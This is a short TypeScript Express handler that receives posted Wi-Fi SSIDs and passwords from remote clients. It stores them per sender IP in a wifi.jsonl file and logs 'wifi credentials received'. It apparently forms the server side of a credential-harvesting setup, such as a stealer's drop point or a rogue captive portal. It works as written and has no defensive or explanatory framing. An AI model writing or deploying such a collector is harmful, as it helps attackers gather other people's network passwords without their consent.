import type { Request, Response } from "express";
import type { Logger } from "pino";
import { writeFileSync, mkdirSync } from "node:fs";
import { join } from "node:path";
import { safeFilename } from "../utils.ts";

export interface UploadContext {
  logger: Logger;
  dataDir: string;
}

export async function handleUpload(
  req: Request,
  res: Response,
  ctx: UploadContext
): Promise<void> {
  try {
    const body = req.body as Record<string, unknown>;
    const ip = req.ip ?? "unknown";
    const ts = new Date().toISOString();

    const payload = {
      time: ts,
      ip,
      hostname: (body.hostname as string) ?? (body.ssid as string) ?? "unknown",
      password: (body.password as string) ?? (body.key as string) ?? "",
      ssid: (body.ssid as string) ?? "",
    };

    const base = join(ctx.dataDir, safeFilename(ip), "upload");
    mkdirSync(base, { recursive: true });
    writeFileSync(join(base, "wifi.jsonl"), JSON.stringify(payload) + "\n", { flag: "a" });

    ctx.logger.info({ ip, ssid: payload.ssid || payload.hostname }, "wifi credentials received");
    res.status(200).send("OK");
  } catch (err) {
    ctx.logger.error({ err }, "upload handler error");
    res.status(500).send("Internal Server Error");
  }
}
